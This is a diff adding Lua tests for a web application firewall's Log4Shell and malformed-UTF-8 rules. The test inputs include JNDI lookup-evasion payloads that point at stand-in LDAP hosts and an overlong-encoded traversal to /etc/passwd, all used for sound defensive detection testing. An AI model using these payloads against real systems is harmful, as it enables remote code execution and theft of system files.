@@ -1385,6 +1385,126 @@ do
   end
 end
 
+-- ── Test 72: rule_log4shell — evasion-variant body hit ──────────────────────
+-- The bare "${jndi:" form is caught by rule_rce (320). rule_log4shell (328)
+-- covers the lookup-syntax evasion that defeats substring matching on 320.
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge")
+
+  local body = [[{"x":"${${::-j}${::-n}${::-d}${::-i}:ldap://evil/a}"}]]
+  local hit, reason, _ttl, action, _hits, waf_rule_id = waf.check(fresh_ctx({
+    method  = "POST",
+    body    = body,
+    headers = { ["Content-Type"] = "application/json" },
+  }))
+  check(hit == true,                                          "72: log4shell — hit=true")
+  check(reason and reason:find("WAF_CVE:LOG4SHELL", 1, true), "72: log4shell — reason prefix")
+  check(action == "challenge",                                "72: log4shell — action=challenge")
+  check(waf_rule_id == 328,                                   "72: log4shell — rule_id=328")
+end
+
+-- ── Test 73: rule_log4shell — header-borne ${lower:j} evasion ───────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge")
+
+  local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({
+    headers = { ["User-Agent"] = "${lower:jndi}:ldap://attacker/x" },
+  }))
+  check(hit == true,                                          "73: log4shell hdr — hit=true")
+  check(reason and reason:find("WAF_CVE:LOG4SHELL", 1, true), "73: log4shell hdr — reason prefix")
+  check(waf_rule_id == 328,                                   "73: log4shell hdr — rule_id=328")
+end
+
+-- ── Test 74: rule_log4shell — clean request must not fire ───────────────────
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge")
+
+  local hit = waf.check(fresh_ctx({
+    method = "POST",
+    body   = [[{"price":"$10","template":"$user.name"}]],
+    headers = { ["Content-Type"] = "application/json" },
+  }))
+  check(hit == false, "74: log4shell — clean POST does not fire")
+end
+
+-- ── Test 74a: rule_log4shell — every evasion tag fires ──────────────────────
+-- One case per evasion family so a regression in any single branch is caught.
+do
+  disable_all_rules()
+  waf.set_rule("rule_log4shell", "challenge")
+
+  local cases = {
+    { args = "x=${env:FOO:-j}ndi:ldap://e/a",            expect = "ENV"         },
+    { args = "x=${sys:user.home}",                       expect = "SYS"         },
+    { args = "x=${main:0}",                              expect = "MAIN"        },
+    { args = "x=${date:yyyy}",                           expect = "DATE"        },
+    { args = "x=${base64:Zm9v}",                         expect = "BASE64"      },
+    { args = "x=${upper:J}ndi:ldap://e/a",               expect = "UPPER"       },
+    { args = "x=${::-j}ndi:ldap://e/a",                  expect = "DEFAULT_VAL" },
+  }
+  for _, c in ipairs(cases) do
+    local hit, reason, _ttl, _action, _hits, waf_rule_id = waf.check(fresh_ctx({ args = c.args }))
+    check(hit == true,
+          "74a/" .. c.expect .. ": hit=true (args=" .. c.args .. ")")
+    check(reason and reason:find("WAF_CVE:LOG4SHELL:" .. c.expect, 1, true),
+          "74a/" .. c.expect .. ": tag present (got " .. tostring(reason) .. ")")
+    check(waf_rule_id == 328,
+          "74a/" .. c.expect .. ": rule_id=328")
+  end
+end
+
+-- ── Test 75: rule_bad_utf8 — invalid lead byte (overlong dot attempt) ───────
+-- "." is U+002E (1 byte). The 2-byte overlong form is 0xC0 0xAE — but 0xC0
+-- itself is never a valid UTF-8 lead byte (RFC 3629 restricts 2-byte leads
+-- to 0xC2..0xDF precisely to forbid this overlong class). detect_bad_utf8
+-- flags it as UTF8_BAD_LEAD, the canonical answer for this attack pattern.
+do
+  disable_all_rules()
+  waf.set_rule("rule_bad_utf8", "logonly")
+
+  local hit, reason, _ttl, action, _hits, waf_rule_id = waf.check(fresh_ctx({
+    args = "q=\xC0\xAE\xC0\xAE/etc/passwd",
+  }))
+  check(hit == true,                                "75: bad_utf8 overlong — hit=true")
+  check(reason and reason:sub(1, 12) == "WAF_BAD_UTF8", "75: bad_utf8 — reason prefix")
+  check(action == "logonly",                        "75: bad_utf8 — action=logonly")
+  check(waf_rule_id == 611,                         "75: bad_utf8 — rule_id=611")
+end
+
+-- ── Test 76: rule_bad_utf8 — truncated multibyte sequence ───────────────────
+-- 0xE2 announces 3 bytes (need=2 continuations); we send it as the final
+-- byte of args so the scan buffer ends mid-sequence — the canonical
+-- "truncated multibyte" case. (Continuation followed by a non-continuation
+-- byte like "&" would trip UTF8_BAD_CONT instead, which is its own tag.)
+do
+  disable_all_rules()
+  waf.set_rule("rule_bad_utf8", "logonly")
+
+  -- args is concatenated as `args .. "&" .. body` so the trailing 0xE2 here
+  -- becomes the final byte of the scan buffer — followed by "&" with no
+  -- second continuation byte. i+need exceeds n → UTF8_TRUNC.
+  local hit, reason = waf.check(fresh_ctx({ args = "x=a\xE2\x82" }))
+  check(hit == true, "76: bad_utf8 trunc — hit=true")
+  check(reason and (reason:find("UTF8_TRUNC", 1, true)
+                    or reason:find("UTF8_BAD_CONT", 1, true)),
+        "76: bad_utf8 trunc — tag in {UTF8_TRUNC, UTF8_BAD_CONT} (got " .. tostring(reason) .. ")")
+end
+
+-- ── Test 77: rule_bad_utf8 — clean ASCII + valid UTF-8 must not fire ────────
+-- "Καλημέρα" (Greek "Good morning") is well-formed UTF-8.
+do
+  disable_all_rules()
+  waf.set_rule("rule_bad_utf8", "logonly")
+
+  local hit = waf.check(fresh_ctx({
+    args = "name=" .. "\xCE\x9A\xCE\xB1\xCE\xBB\xCE\xB7\xCE\xBC\xCE\xAD\xCF\x81\xCE\xB1",
+  }))
+  check(hit == false, "77: bad_utf8 — clean Greek UTF-8 does not fire")
+end
+
 if fails > 0 then
   io.stderr:write(string.format("\n%d severity test(s) failed\n", fails))
   os.exit(1)
